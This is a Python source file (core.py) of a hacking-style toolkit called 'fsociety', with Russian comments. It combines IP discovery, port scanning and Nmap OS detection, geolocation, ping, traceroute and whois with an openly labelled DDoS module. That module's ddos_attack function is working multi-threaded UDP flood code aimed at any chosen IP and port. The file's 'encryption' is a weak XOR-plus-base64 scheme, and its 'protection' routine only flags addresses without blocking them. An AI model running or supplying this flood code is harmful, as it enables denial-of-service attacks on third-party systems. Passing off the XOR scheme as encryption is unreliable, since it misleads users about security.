# core.py — основная логика fsociety

import socket
import netifaces
import requests
import platform
import threading
import time
import random
import base64
import subprocess
import sys
from collections import defaultdict

# ==================== IP-МОДУЛЬ ====================
def ip_all():
    """Все IP-адреса"""
    result = {}
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        ips = []
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                ip = addr['addr']
                if ip != '127.0.0.1':
                    ips.append({'ip': ip, 'type': 'IPv4'})
        if netifaces.AF_INET6 in addrs:
            for addr in addrs[netifaces.AF_INET6]:
                ip = addr['addr'].split('%')[0]
                if ip != '::1':
                    ips.append({'ip': ip, 'type': 'IPv6'})
        if ips:
            result[iface] = ips
    return result

def ip_main():
    """Основной IPv4"""
    for iface, ips in ip_all().items():
        for entry in ips:
            if entry['type'] == 'IPv4' and not entry['ip'].startswith('169.254'):
                return entry['ip']
    return None

def ip_show():
    """Показать IP в консоли"""
    print("\n📡 IPCONF")
    print("=" * 30)
    for iface, ips in ip_all().items():
        print(f"📶 {iface}")
        for entry in ips:
            print(f"   {entry['type']}: {entry['ip']}")
        print("-" * 20)
    ip = ip_main()
    if ip:
        print(f"🌐 Основной IP: {ip}")
    else:
        print("❌ IP не найден")

# ==================== ПОРТЫ ====================
def scan_ports(ip, ports=None):
    """Сканировать порты (встроенный сканер)"""
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 110, 443, 3389, 8080]
    open_ports = []
    print(f"🔍 Сканируем {ip}...")
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((ip, port)) == 0:
            open_ports.append(port)
            print(f"   Порт {port} — ОТКРЫТ")
        sock.close()
    return open_ports

# ==================== NMAP ====================
def nmap_scan(ip, ports='1-1000'):
    """Сканирует порты через Nmap"""
    try:
        import nmap
        nm = nmap.PortScanner()
        nm.scan(ip, ports)
        result = {}
        for host in nm.all_hosts():
            result[host] = []
            for proto in nm[host].all_protocols():
                for port in nm[host][proto].keys():
                    state = nm[host][proto][port]['state']
                    service = nm[host][proto][port].get('name', 'unknown')
                    result[host].append({
                        'port': port,
                        'protocol': proto,
                        'state': state,
                        'service': service
                    })
        return result
    except:
        print("⚠️ Nmap не найден. Использую встроенный сканер.")
        return _builtin_scan(ip, ports)

def _builtin_scan(ip, ports):
    """Встроенный сканер портов (если Nmap не установлен)"""
    if isinstance(ports, str) and '-' in ports:
        start, end = map(int, ports.split('-'))
        ports = list(range(start, end+1))
    else:
        ports = [int(p) for p in ports.split(',')] if isinstance(ports, str) else ports

    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((ip, port)) == 0:
            open_ports.append(port)
        sock.close()
    return {ip: [{'port': p, 'protocol': 'tcp', 'state': 'open', 'service': 'unknown'} for p in open_ports]}

def nmap_os(ip):
    """Определяет ОС через Nmap"""
    try:
        import nmap
        nm = nmap.PortScanner()
        nm.scan(ip, arguments='-O')
        return nm[ip].get('osmatch', [{'name': 'unknown'}])[0]['name']
    except:
        return "Nmap не установлен или ОС не определена"

def nmap_services(ip):
    """Показывает службы на открытых портах"""
    result = nmap_scan(ip, '1-1000')
    if result and ip in result:
        services = []
        for item in result[ip]:
            services.append({
                'port': item['port'],
                'service': item['service']
            })
        return services
    return []

# ==================== ГЕОЛОКАЦИЯ ====================
def geo(ip):
    """Геолокация по IP"""
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = r.json()
        if data['status'] == 'success':
            return f"{data['city']}, {data['country']} ({data['isp']})"
        return None
    except:
        return None

# ==================== СИСТЕМА ====================
def sysinfo():
    """Информация о системе"""
    print(f"🖥️ ОС: {platform.system()} {platform.release()}")
    print(f"🧠 Архитектура: {platform.machine()}")

# ==================== DDoS-МОДУЛЬ ====================
ddos_active = False
ddos_threads = []
packet_counter = defaultdict(int)
blocked_ips = set()

def ddos_attack(ip, port, duration, threads=10):
    global ddos_active
    ddos_active = True
    print(f"💣 Запуск DDoS-атаки на {ip}:{port} на {duration} сек, {threads} потоков")
    
    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1024)
        end_time = time.time() + duration
        while time.time() < end_time and ddos_active:
            sock.sendto(data, (ip, port))
    
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        ddos_threads.append(t)
    
    time.sleep(duration)
    ddos_active = False
    for t in ddos_threads:
        t.join()
    ddos_threads.clear()
    print("✅ Атака завершена")

def ddos_protect(ip, threshold=100):
    print(f"🛡️ Запущена защита для {ip}, порог: {threshold} пакетов/сек")
    
    def monitor():
        while True:
            for ip_addr, count in list(packet_counter.items()):
                if count > threshold:
                    if ip_addr not in blocked_ips:
                        blocked_ips.add(ip_addr)
                        print(f"🚫 IP {ip_addr} заблокирован (превышен порог)")
                packet_counter[ip_addr] = 0
            time.sleep(1)
    
    threading.Thread(target=monitor, daemon=True).start()
    
    def packet_listener():
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        sock.bind((ip, 0))
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while True:
            data, addr = sock.recvfrom(65535)
            if addr[0] not in blocked_ips:
                packet_counter[addr[0]] += 1
    
    threading.Thread(target=packet_listener, daemon=True).start()

# ==================== ШИФРОВАНИЕ ====================
def encrypt(text, key):
    encrypted = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
    return base64.b64encode(encrypted.encode()).decode()

def decrypt(text, key):
    encrypted = base64.b64decode(text.encode()).decode()
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(encrypted))

# ==================== СЕТЕВЫЕ УТИЛИТЫ ====================
def ping(ip):
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, '1', ip]
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, text=True)
        return 'ttl=' in output.lower()
    except:
        return False

def traceroute(ip):
    param = '-n' if platform.system().lower() == 'windows' else ''
    command = ['tracert' if platform.system().lower() == 'windows' else 'traceroute', ip]
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, text=True)
        return output
    except:
        return "Ошибка трассировки"

def whois(domain):
    try:
        import whois
        w = whois.whois(domain)
        return {
            'name': w.name,
            'org': w.org,
            'country': w.country,
            'creation_date': w.creation_date,
            'expiration_date': w.expiration_date
        }
    except:
        return "WHOIS не удался (установи python-whois)"